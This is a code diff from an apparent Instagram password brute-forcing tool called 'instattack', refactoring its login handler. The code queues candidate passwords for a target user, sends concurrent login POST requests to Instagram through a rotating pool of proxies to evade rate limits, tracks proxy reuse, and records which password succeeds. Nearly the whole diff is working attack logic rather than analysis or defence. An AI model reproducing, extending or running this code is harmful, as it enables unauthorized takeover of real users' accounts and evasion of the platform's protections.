@@ -2,25 +2,50 @@ from __future__ import absolute_import
 
 import asyncio
 import aiohttp
+import aiojobs
 import collections
 
 from instattack import logger
-from instattack.conf import settings
-from instattack.lib import starting, percentage
-
-from instattack.src.exceptions import ClientResponseError
-from instattack.src.proxies.exceptions import PoolNoProxyError
+from instattack.lib import percentage
 
 from .models import LoginAttemptContext, LoginContext
 from .exceptions import NoPasswordsError
-from .requests import PostRequestHandler
+from .requests import RequestHandler
 from .utils import limit_on_success, limit_as_completed
 
 
 log = logger.get_async('Login Handler')
 
 
-class LoginHandler(PostRequestHandler):
+"""
+In Regard to Cancelled Tasks on Web Server Disconnect:
+---------
+<https://github.com/aio-libs/aiohttp/issues/2098>
+
+Now web-handler task is cancelled on client disconnection (normal socket closing
+by peer or just connection dropping by unpluging a wire etc.)
+
+This is pretty normal behavior but it confuses people who come from world of
+synchronous WSGI web frameworks like flask or django.
+
+>>> async def handler(request):
+>>>     async with request.app['db'] as conn:
+>>>          await conn.execute('UPDATE ...')
+
+The above is problematic if there is a client disconnect.
+
+To remedy:
+
+(1)  For client disconnections/fighting against Task cancellation I would
+     recommend asyncio.shield. That's why it exists
+(2)  In case user wants a way to control tasks in a more granular way, then I
+     would recommend aiojobs
+(3)  Ofc if user wants to execute background tasks (inside the same loop) I
+      would also recommend aiojobs
+"""
+
+
+class LoginHandler(RequestHandler):
 
     __name__ = 'Login Handler'
 
@@ -34,13 +59,10 @@ class LoginHandler(PostRequestHandler):
         self.log_attempts = config['log']['attempts']
         self.log_login = config['log']['login']
 
-        self.results = asyncio.Queue()
-        self.attempts = asyncio.Queue()
         self.passwords = asyncio.Queue()
 
         self.num_completed = 0
-        # Index for the current password and attempts per password.
-        self.login_index = 0
+        self.login_index = 0  # Index for the current password and attempts per password.
         self.attempts_count = collections.Counter()  # Indexed by Password
         self.proxies_count = collections.Counter()  # Indexed by Proxy Unique ID
 
@@ -55,17 +77,38 @@ class LoginHandler(PostRequestHandler):
         return await self.attack(loop)
 
     async def attack(self, loop):
-        # Make sure we are just returning the results from the login attempts
-        # method, or possibly the results consumption, depending.
-        result = await self.attempt_login(loop)
+        scheduler = await aiojobs.create_scheduler(limit=None)
+
+        result = await self.attempt_login(loop, scheduler)
+        if not result:
+            raise RuntimeError('Attempt login must return result.')
 
         # If we return the result right away, the handler will be stopped and
         # leftover tasks will be cancelled.  We have to make sure to save the
         # proxies before doing that.
+        log.debug('Waiting for Background Tasks to Finish')
+
+        # [!] Will suppress any errors of duplicate attempts
+        await scheduler.close()
+
+        log.debug('Cleaning Up Remnant Tasks')
         await self.cleanup(loop)
         return result
 
-    @starting('Cleaning Up')
+    async def prepopulate(self, loop):
+
+        futures = []
+
+        log.start(f'Generating {self.limit} Attempts for User {self.user.username}.')
+        async for password in self.user.generate_attempts(loop, limit=self.limit):
+            futures.append(self.passwords.put(password))
+
+        await asyncio.gather(*futures)
+        if len(futures) == 0:
+            raise NoPasswordsError()
+
+        log.complete(f"Prepopulated {len(futures)} Password Attempts")
+
     async def cleanup(self, loop):
         """
         Cleans up the leftover remaining tasks that need to be completed before
@@ -91,38 +134,7 @@ class LoginHandler(PostRequestHandler):
         leftover = [tsk for tsk in self._all_tasks if not tsk.done()]
         log.info(f'{len(leftover)} Leftover Incomplete Tasks.')
 
-    @starting('Password Prepopulation')
-    async def prepopulate(self, loop):
-        futures = []
-        async for password in self.user.generate_attempts(loop, limit=self.limit):
-            futures.append(self.passwords.put(password))
-
-        await asyncio.gather(*futures)
-        if len(futures) == 0:
-            raise NoPasswordsError()
-
-        log.complete(f"Prepopulated {len(futures)} Password Attempts")
-
-    async def login_task_generator(self, loop, session):
-        """
-        Generates coroutines for each password to be attempted and yields
-        them in the generator.
-
-        We don't have to worry about a stop event if the authenticated result
-        is found since this will generate relatively quickly and the coroutines
-        have not been run yet.
-        """
-        while not self.passwords.empty():
-            password = await self.passwords.get()
-            if password:
-                context = LoginContext(
-                    index=self.login_index,
-                    password=password
-                )
-                self.login_index += 1
-                yield self.login_with_password(loop, session, context)
-
-    async def attempt_login(self, loop):
+    async def attempt_login(self, loop, scheduler):
         """
         For each password in the queue, runs the login_with_password coroutine
         concurrently in order to validate each password.
@@ -139,54 +151,63 @@ class LoginHandler(PostRequestHandler):
                 return True
             return False
 
+        async def login_task_generator(session):
+            """
+            Generates coroutines for each password to be attempted and yields
+            them in the generator.
+
+            We don't have to worry about a stop event if the authenticated result
+            is found since this will generate relatively quickly and the coroutines
+            have not been run yet.
+            """
+            while not self.passwords.empty():
+                password = await self.passwords.get()
+                if password:
+                    context = LoginContext(
+                        index=self.login_index,
+                        password=password
+                    )
+                    self.login_index += 1
+                    yield self.attempt_with_password(loop, session, context, scheduler)
+
         log.debug('Waiting on Start Event...')
         await self.start_event.wait()
 
-        log.start('Started Session...')
+        log.debug('Fetching Cookies')
+        cookies = await self.cookies()
 
-        while not self.stop_event.is_set():
-            cookies = await self.cookies()
-            async with aiohttp.ClientSession(
-                connector=self._connector,
-                cookies=cookies,
-                timeout=self._timeout,
-            ) as session:
+        log.debug('Starting Client Session')
 
-                gen = self.login_task_generator(loop, session)
-                async for result in limit_as_completed(gen, self.batch_size, stop_on=stop_on):
-                    log.debug('Received Result from Generator')
+        async with aiohttp.ClientSession(
+            connector=self._connector,
+            cookies=cookies,
+            timeout=self._timeout,
+        ) as session:
 
-                    if self.stop_event.is_set():
-                        log.debug('Stop Event Noticed... Breaking Out of Generator')
-                        break
+            gen = login_task_generator(session)
 
-                    # Generator Does Not Yield None on No More Coroutines
-                    if not result.conclusive:
-                        raise RuntimeError("Result should be valid and conclusive.")
+            async for result in limit_as_completed(gen, self.batch_size, stop_on=stop_on):
 
-                    self.num_completed += 1
-                    log.success(
-                        f'Percent Done: {percentage(self.num_completed, self.login_index)}')
+                # Generator Does Not Yield None on No More Coroutines
+                if not result.conclusive:
+                    raise RuntimeError("Result should be valid and conclusive.")
 
-                    # Store The Result
-                    log.debug('Storing Result')
-                    await self.results.put(result)
+                self.num_completed += 1
+                log.success(
+                    f'Percent Done: {percentage(self.num_completed, self.login_index)}')
 
-                    if result.authorized:
-                        log.success(str(result), extra={
-                            'password': result.context.password
-                        })
+                if result.authorized:
+                    # [!] Will suppress any errors of duplicate attempts
+                    await scheduler.spawn(self.user.write_attempt(
+                        result.context.password, success=True))
+                    break
+                else:
+                    if not result.not_authorized:
+                        raise RuntimeError('Result should not be authorized.')
 
-                        # TODO: Do we really need to set the stop event?
-                        log.debug('Setting Stop Event')
-                        self.stop_event.set()
-                    else:
-                        if not result.not_authorized:
-                            raise RuntimeError('Result should not be authorized.')
-
-                        log.debug('Storing Attempt')
-                        await self.attempts.put(result.context.password)
-                        log.debug('Attempt Stored')
+                    # [!] Will suppress any errors of duplicate attempts
+                    await scheduler.spawn(self.user.write_attempt(
+                        result.context.password, success=False))
 
         log.complete('Closing Session')
         await asyncio.sleep(0)
@@ -194,40 +215,7 @@ class LoginHandler(PostRequestHandler):
         log.debug('Returning Result')
         return result
 
-    async def login_attempt_task_generator(self, loop, session, context):
-        """
-        Generates coroutines for each password to be attempted and yields
-        them in the generator.
-
-        We don't have to worry about a stop event if the authenticated result
-        is found since this will generate relatively quickly and the coroutines
-        have not been run yet.
-        """
-        while True:
-            proxy = await self.proxy_handler.pool.get()
-            if not proxy:
-                # TODO: Raise Exception Here Instead
-                log.error('No More Proxies in Pool')
-                break
-
-            if proxy.unique_id in self.proxies_count:
-                log.warning(
-                    f'Already Used Proxy {self.proxies_count[proxy.unique_id]} Times.',
-                    extra={'proxy': proxy}
-                )
-
-            new_context = LoginAttemptContext(
-                index=self.attempts_count[context.password],
-                parent_index=context.index,
-                password=context.password,
-                proxy=proxy,
-            )
-
-            self.proxies_count[proxy.unique_id] += 1
-            self.attempts_count[context.password] += 1
-            yield self.login_request(loop, session, new_context)
-
-    async def login_with_password(self, loop, session, context):
+    async def attempt_with_password(self, loop, session, context, scheduler):
         """
         Makes concurrent fetches for a single password and limits the number of
         current fetches to the batch_size.  Will return when it finds the first
@@ -235,87 +223,49 @@ class LoginHandler(PostRequestHandler):
         """
         log = logger.get_async(self.__name__, subname="login_with_password")
 
+        async def login_attempt_task_generator():
+            """
+            Generates coroutines for each password to be attempted and yields
+            them in the generator.
+
+            We don't have to worry about a stop event if the authenticated result
+            is found since this will generate relatively quickly and the coroutines
+            have not been run yet.
+            """
+            while True:
+                proxy = await self.proxy_handler.pool.get()
+                if not proxy:
+                    # TODO: Raise Exception Here Instead
+                    log.error('No More Proxies in Pool')
+                    break
+
+                if proxy.unique_id in self.proxies_count:
+                    log.warning(
+                        f'Already Used Proxy {self.proxies_count[proxy.unique_id]} Times.',
+                        extra={'proxy': proxy}
+                    )
+
+                new_context = LoginAttemptContext(
+                    index=self.attempts_count[context.password],
+                    parent_index=context.index,
+                    password=context.password,
+                    proxy=proxy,
+                )
+
+                self.proxies_count[proxy.unique_id] += 1
+                self.attempts_count[context.password] += 1
+                yield self.login_request(loop, session, new_context, scheduler)
+
         # Wait for start event to signal that we are ready to start making
         # requests with the proxies.
         await self.start_event.wait()
 
         log.complete(f'Atempting Login with {context.password}')
-        try:
-            result = await limit_on_success(
-                self.login_attempt_task_generator(loop, session, context),
-                self.attempt_batch_size
-            )
-        except PoolNoProxyError as e:
-            log.error(e)
-            self.stop_event.set()
-            return
+
+        result = await limit_on_success(
+            login_attempt_task_generator(),
+            self.attempt_batch_size
+        )
+
         log.complete(f'Done Attempting Login with {context.password}', extra={'other': result})
         return result
-
-    async def login_request(self, loop, session, context):
-        """
-        For a given password, makes a series of concurrent requests, each using
-        a different proxy, until a result is found that authenticates or dis-
-        authenticates the given password.
-
-        TODO
-        ----
-        We might want to incorporate handling of a "Too Many Requests" exception
-        that is smarter and will notify the handler to use a different proxy and
-        note the time.
-        """
-        log = logger.get_async('Requesting Login', subname='login_request')
-        log.disable_on_false(self.log_attempts)
-
-        try:
-            # Temporarary to make sure things are working properly.
-            if not self.headers:
-                raise RuntimeError('Headers should be set.')
-
-            async with session.post(
-                settings.INSTAGRAM_LOGIN_URL,
-                headers=self.headers,
-                data=self._login_data(context.password),
-                ssl=False,
-                proxy=context.proxy.url  # Only Http Proxies Are Supported by AioHTTP
-            ) as response:
-                try:
-                    result = await self.handle_client_response(response, context, log)
-                except ClientResponseError as e:
-                    log.error(e, extra={
-                        'response': response,
-                        'context': context
-                    })
-                    # Not sure if we want to note this as an error or not, it might
-                    # be better to note as inconclusive.
-                    task = asyncio.create_task(self.proxy_error(context.proxy, e))
-                    self._all_tasks.append(task)
-                else:
-                    if not result:
-                        raise RuntimeError("Result should not be None here.")
-
-                    task = asyncio.create_task(self.proxy_success(context.proxy))
-                    self._all_tasks.append(task)
-                    return result
-
-        except ClientResponseError as e:
-            log.error(e, extra={
-                'response': response,
-                'context': context
-            })
-            # Not sure if we want to note this as an error or not, it might
-            # be better to note as inconclusive.
-            task = asyncio.create_task(self.proxy_error(context.proxy, e))
-            self._all_tasks.append(task)
-
-        except Exception as e:
-            task = await self.handle_request_error(e, context.proxy, context, log)
-            if task:
-                self._all_tasks.append(task)
-
-    async def save(self, loop):
-        log = logger.get_async(self.__name__, subname="save")
-
-        log.info('Dumping Password Attempts')
-        log.critical('Have to make sure were not saving a successful password.')
-        return await self.user.write_attempts(self.attempts)
